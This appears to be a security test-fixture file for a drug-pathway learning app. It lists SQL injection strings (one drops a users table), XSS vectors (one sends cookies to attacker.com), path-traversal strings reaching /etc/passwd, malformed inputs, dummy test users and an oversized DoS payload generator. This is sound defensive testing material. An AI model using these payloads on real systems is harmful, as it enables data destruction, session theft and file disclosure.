/**
 * Drug Path Visualiser (BioLumen) - Task 26 Security Test Suite Fixtures
 *
 * Dedicated security payloads and mock data covering:
 * - OWASP Top 10 vectors (Injection, Broken Authentication, Broken Access Control, Security Misconfiguration)
 * - SQL Injection attack strings
 * - Cross-Site Scripting (XSS) vectors
 * - Oversized / DoS payload generation
 * - Malformed JSON, non-alphanumeric identifiers, path traversal, null bytes
 * - Malformed, tampered, and expired JWT credentials
 * - Malformed quiz and pathway request structures
 */

export const SQL_INJECTION_PAYLOADS = [
  "' OR '1'='1",
  "1' OR '1' = '1",
  "' OR 1=1 --",
  "admin' --",
  "' UNION SELECT null, null, null, null --",
  "'; DROP TABLE users; --",
  "1; SELECT pg_sleep(5); --",
  "' OR ''='",
  "\" OR \"1\"=\"1",
  "' HAVING 1=1 --"
] as const;

export const XSS_PAYLOADS = [
  "<script>alert('XSS-1')</script>",
  "<img src=x onerror=alert('XSS-2')>",
  "<svg/onload=alert('XSS-3')>",
  "javascript:alert('XSS-4')",
  "<iframe src=\"javascript:alert('XSS-5')\"></iframe>",
  "\"><script>document.location='http://attacker.com/steal?c='+document.cookie</script>"
] as const;

export const PATH_TRAVERSAL_PAYLOADS = [
  "../../etc/passwd",
  "..%2F..%2Fetc%2Fpasswd",
  "....//....//etc/passwd",
  "drug/../../../secret",
  "..\\..\\windows\\system32"
] as const;

export const INVALID_IDENTIFIER_PAYLOADS = [
  "drug-with-spaces in name",
  "drug@invalid!",
  "drug#hashtag",
  "drug$dollar",
  "ibuprofen%00nullbyte",
  "ibuprofen\u0000",
  "",
  "   ",
  "a".repeat(300) // Oversized identifier
] as const;

export const MALFORMED_JSON_PAYLOADS = [
  '{ "answers": [ bad json syntax ',
  '{"unclosed: string',
  '{key_without_quotes: 123}',
  'NaN',
  'undefined',
  '{"a": 1,}' // Trailing comma syntax error
] as const;

/**
 * Isolated security test user fixtures.
 * Note: All identifiers are strictly prefixed with 'test-sec-' to prevent any conflict
 * with development/production users and allow deterministic cleanup.
 */
export const SECURITY_TEST_USERS = {
  learnerAlice: {
    id: 'test-sec-learner-alice',
    email: 'sec_alice@test.local',
    name: 'Security Learner Alice',
    password: 'AliceStrongPassword123!',
    role: 'learner' as const
  },
  learnerBob: {
    id: 'test-sec-learner-bob',
    email: 'sec_bob@test.local',
    name: 'Security Learner Bob',
    password: 'BobStrongPassword123!',
    role: 'learner' as const
  },
  adminCarol: {
    id: 'test-sec-admin-carol',
    email: 'sec_carol@test.local',
    name: 'Security Admin Carol',
    password: 'CarolStrongAdminPassword123!',
    role: 'admin' as const
  },
  demotedAdminDan: {
    id: 'test-sec-demoted-dan',
    email: 'sec_dan@test.local',
    name: 'Security Demoted Dan',
    password: 'DanStrongPassword123!',
    role: 'learner' as const // In DB his role is learner, but will test with stale admin token
  }
} as const;

/**
 * Generates an oversized payload string exceeding 100KB for DoS payload testing.
 */
export function generateOversizedPayload(sizeInKb: number = 120): string {
  const padSize = sizeInKb * 1024;
  return JSON.stringify({
    data: 'A'.repeat(padSize),
    overflow: true
  });
}
